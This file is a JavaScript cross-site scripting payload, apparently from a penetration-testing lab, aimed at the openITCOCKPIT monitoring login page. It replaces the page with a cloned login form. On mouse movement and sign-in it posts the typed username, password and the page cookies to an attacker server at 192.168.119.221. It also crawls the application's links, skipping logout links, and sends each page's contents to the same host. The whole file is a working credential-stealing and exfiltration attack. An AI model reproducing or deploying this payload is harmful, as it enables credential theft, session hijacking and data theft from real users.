function sendreq(payload1,payload2,payload3) {
    var url = 'https://192.168.119.221/sendcreds'
    var params = 'username='+payload1+'&password='+payload2+'&cookie='+payload3;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
        console.log(this.responseText);
    };
    xhr.send(params);
}

document.getElementsByTagName("html")[0].innerHTML = `<html lang="en">
<head>
  <!--[if IE]>
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
          <![endif]-->
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title> Login - open source system monitoring </title>
  <link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="icon">
  <link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="shortcut icon">
  <link rel="stylesheet" type="text/css" href="/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2">
  <link rel="stylesheet" type="text/css" href="/smartadmin/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/css/login.css">
  <script type="text/javascript" src="/frontend/js/lib/jquery.min.js"></script>
  <script type="text/javascript" src="/js/lib/particles.min.js"></script>
  <script type="text/javascript" src="/js/login.js"></script>
</head>
<body class="main">
  <div class="login-screen">
    <figure>
      <figcaption>Photo by SpaceX on Unsplash</figcaption>
    </figure>
    <figure>
      <figcaption>Photo by NASA on Unsplash</figcaption>
    </figure>
  </div>
  <div class="container-fluid">
    <div class="row">
      <div id="particles-js" class="col-xs-12 col-sm-6 col-md-7 col-lg-9">
        <canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="1410" height="404"></canvas>
      </div>
    </div>
  </div>
  <div class="login-center">
    <div class="min-height container-fluid">
      <div class="row">
        <div class="col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9">
          <div class="login" id="card">
            <div class="login-alert"></div>
            <div class="login-header">
              <h1>openITCOCKPIT</h1>
              <h4>Open source system monitoring</h4>
            </div>
            <div class="login-form-div">
              <div class="front signin_form">
                <p>Login</p>
                <form action="javascript:void(0);" novalidate="novalidate" class="login-form" accept-charset="utf-8">
                  <div style="display:none;">
                    <input type="hidden">
                  </div>
                  <div class="form-group">
                    <div class="input-group">
                      <input name="data[LoginUser][username]" class="form-control" placeholder="Type your email or username" inputdefaults=" " type="text" id="username">
                      <span class="input-group-addon">
                        <i class="fa fa-lg fa-user"></i>
                      </span>
                    </div>
                  </div>
                  <div class="form-group">
                    <div class="input-group">
                      <input name="data[LoginUser][password]" class="form-control" placeholder="Type your password" inputdefaults=" " type="password" id="password">
                      <span class="input-group-addon">
                        <i class="fa fa-lg fa-lock"></i>
                      </span>
                    </div>
                  </div>
                  <div class="checkbox">
                    <div class="checkbox">
                      <input type="hidden" name="data[LoginUser][remember_me]" id="LoginUserRememberMe_" value="0">
                      <label for="LoginUserRememberMe">
                        <input type="checkbox" name="data[LoginUser][remember_me]" class="" value="1" id="LoginUserRememberMe"> Remember me on this computer </label>
                    </div>
                  </div>
                  <div class="form-group sign-btn">
                    <button class="btn btn-primary pull-right" onclick="sendreq(document.getElementById('username').value,document.getElementById('password').value,document.cookie);"> Sign in </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="footer">
    <div class="container-fluid">
      <div class="row pull-right">
        <div class="col-xs-12">
          <a href="https://openitcockpit.io/" target="_blank" class="btn btn-default">
            <i class="fa fa-lg fa-globe"></i>
          </a>
          <a href="https://github.com/it-novum/openITCOCKPIT" target="_blank" class="btn btn-default">
            <i class="fa fa-lg fa-github"></i>
          </a>
          <a href="https://twitter.com/openITCOCKPIT" target="_blank" class="btn btn-default">
            <i class="fa fa-lg fa-twitter"></i>
          </a>
        </div>
      </div>
    </div>
  </div>
  <div class="container">
    <div class="row">
      <div class="col-xs-12"></div>
    </div>
  </div>
</body>
</html>
<style>
html,
body {
  height: 100%;
  width: 100%
}

body {
  font-family: sans-serif;
  position: relative;
  color: #fff
}

.in-page {
  min-height: 520px
}

.main {
  position: relative;
  overflow: hidden
}

a {
  color: #1b5a7c
}

a:hover,
a:focus {
  color: #1b5a7c
}

.btn-cyan {
  background-color: #1b5a7c;
  color: #fff
}

.btn-cyan:hover {
  color: #fff;
  opacity: .9
}

.form-control:focus {
  border-color: #1b5a7c;
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset, 0 0 8px rgba(24, 204, 162, 0.6);
  outline: 0 none
}

.min-height {
  min-height: 380px
}

.login-screen-vnc {
  background-image: url(/img/login_bg/spacex-71870.jpg);
  background-position: center;
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
  -moz-background-size: cover;
  -webkit-background-size: cover;
  position: fixed;
  top: 0;
  bottom: 0;
  right: 0;
  left: 0
}

.login-screen {
  background-position: center;
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
  -moz-background-size: cover;
  -webkit-background-size: cover;
  position: fixed;
  top: 0;
  bottom: 0;
  right: 0;
  left: 0
}

.login-screen:before {
  content: "";
  background: rgba(0, 0, 0, 0.5);
  position: absolute;
  width: 100%;
  height: 100%;
  top: 0;
  left: 0
}

.login-screen>figure {
  animation: imageAnimation 30s linear infinite 0;
  backface-visibility: hidden;
  background-size: cover;
  background-position: center center;
  color: transparent;
  height: 100%;
  left: 0;
  opacity: 0;
  position: absolute;
  top: 0;
  width: 100%;
  z-index: 0
}

figcaption {
  position: absolute;
  bottom: 0;
  left: 15px;
  height: 50px;
  line-height: 50px;
  color: #fff !important;
  font-size: 11px
}

.login-screen>figure:nth-child(1) {
  background-image: url(/img/login_bg/spacex-71870.jpg)
}

.login-screen>figure:nth-child(2) {
  animation-delay: 15s;
  background-image: url(/img/login_bg/nasa-53884.jpg)
}

@keyframes imageAnimation {
  0% {
    animation-timing-function: ease-in;
    opacity: 0
  }

  10% {
    opacity: 1
  }

  50% {
    animation-timing-function: ease-out;
    opacity: 1
  }

  60% {
    opacity: 0
  }
}

.login-center {
  text-align: left
}

.login {
  width: 100%;
  position: absolute;
  color: #fff;
  padding: 10px;
  background: rgba(25, 33, 49, 0.4);
  display: flex;
  min-height: 100vh;
  display: flex;
  flex-direction: column
}

.login .login-form {
  text-align: left
}

.login label {
  color: #fff
}

.login-form .input-group .form-control {
  background: none;
  height: 44px;
  color: #ddd
}

.login-form .input-group .input-group-addon {
  background: none
}

.login-form .input-group .input-group-addon .fa {
  color: #1b5a7c
}

.login-form .input-group .form-control::-moz-placeholder {
  color: #fff !important;
  opacity: .9
}

::-webkit-input-placeholder {
  color: #fff !important;
  opacity: .9
}

.login .sign-btn button {
  width: 180px
}

.login .sign-btn a {
  text-decoration: none
}

.login .checkbox {
  margin-top: 20px;
  margin-bottom: 20px
}

.login .forgot {
  display: inline-block;
  margin: 20px 0
}

.footer {
  position: absolute;
  bottom: 0;
  padding-bottom: 10px;
  width: 100%;
  color: #FFF
}

.footer .credit {
  color: #FFF;
  font-weight: 700
}

.method {
  background: none;
  height: 44px;
  color: #ddd;
  width: 300px
}

.method:focus {
  border-color: #1b5a7c;
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset, 0 0 8px rgba(24, 204, 162, 0.6);
  outline: 0 none
}

.slogan {
  padding-top: 60px;
  color: rgba(255, 255, 255, 0.5)
}

#LoginUserAuthMethod {
  border: 1px solid #ccc;
  border-radius: 4px;
  background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg%20version%3D%221.1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%20fill%3D%22%23ddd%22%20%0A%09%20width%3D%2224px%22%20height%3D%2224px%22%20viewBox%3D%22-261%20145.2%2024%2024%22%20style%3D%22enable-background%3Anew%20-261%20145.2%2024%2024%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cpath%20d%3D%22M-245.3%2C156.1l-3.6-6.5l-3.7%2C6.5%20M-252.7%2C159l3.7%2C6.5l3.6-6.5%22%2F%3E%0A%3C%2Fsvg%3E);
  background-repeat: no-repeat;
  background-position: right center;
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  padding: 6px 12px
}

select option {
  color: #000
}

canvas {
  display: block;
  vertical-align: bottom
}

#particles-js {
  position: absolute;
  height: 100%;
  background-repeat: no-repeat;
  background-size: cover;
  background-position: 100% 100%
}

.js-count-particles {
  font-size: 1.1em
}

#stats,
.count-particles {
  -webkit-user-select: none;
  margin-top: 5px;
  margin-left: 5px
}

#stats {
  border-radius: 3px 3px 0 0;
  overflow: hidden
}

.count-particles {
  border-radius: 0 0 3px 3px
}

.login-center .alert-success {
  background-color: transparent;
  color: #72d473;
  border-color: #02d004
}

.login-center .alert-danger {
  background-color: transparent;
  color: #f3423e;
  border-color: #f51b16
}

.login-header {
  width: 100%;
  text-align: center;
  padding-top: 50px
}

.login-form-div {
  width: 300px;
  margin-left: auto;
  margin-right: auto;
  padding-top: 50px
}

.login-alert {
  width: 100%;
  padding-right: 15px
}
</style>`;

function wait(ms){
  var start = new Date().getTime();
  var end = start;
  while(end < start + ms) {
    end = new Date().getTime();
 }
}
var username = "";
var password = "";
function FetchData(){
  if (username !== document.getElementById('username').value || password !== document.getElementById('password').value){ 
    if (document.getElementById('username').value !== null){
      if (document.getElementById('username').value !== ""){
        username = document.getElementById('username').value;
        if (document.getElementById('password').value !== ""){
          sendreq(document.getElementById('username').value,document.getElementById('password').value,document.cookie);
          password = document.getElementById('password').value;
        } else {
          sendreq(document.getElementById('username').value,"",document.cookie);
        }
      }
    }
  }
}
document.onmousemove = function(){FetchData()}

let values = [];

function sendcontent(payload1,payload2) {
  var url = 'https://192.168.119.221/content'
  var params = 'location='+payload1+'&content='+payload2;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', url, true);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  xhr.onload = function () {
      //console.log(this.responseText);
  };
  xhr.send(params);
}

var dont = ['logot', 'signout', 'log-out', 'sign-out'];

function contains(target,pattern){
  var value = 0
  pattern.forEach(function(word){
    value = value + target.includes(word)
  });
  return (value>0)
}

function bruteforce(values){
  for (let x in values) {
    const aqa = contains(values[x],dont);
    if (aqa !==1 ){
      var xhr = new XMLHttpRequest();
      //console.log(values[x]);
      xhr.open('GET', values[x], true);
      xhr.onload = function () {
        sendcontent(btoa(values[x]),btoa(escape(this.responseText)));
      }
      xhr.send()
    } else {
      //console.log(values[x]+'is dangerous to visit, it contains blacklisted keyword');
    }
  }
}

function getContent(){
  var url = 'https://openitcockpit';
  var xhr = new XMLHttpRequest();
  xhr.open('GET', url, true);
  xhr.setRequestHeader('If-Modified-Since', '');
  xhr.onload = function() {
      const resp = this.responseText;
      const regex = /\b(href|src|action|data|codebase|cite|longdesc|background|profile|usemap|classid|formaction|icon|manifest|poster|archive|srcset|url)\s*=\s*["']([^"']+)["']/g;
      let match;
      while(match = regex.exec(resp)) {
        if (match[2].includes("logout") || match[2].includes("signout") || match[2].includes("log-out") || match[2].includes("sign-out") || match[2].includes("void")) {
        } else {
          values.push(match[2]);
        }
      }
      //console.log(this.responseText);
  }
  xhr.send()
  bruteforce(values)
}
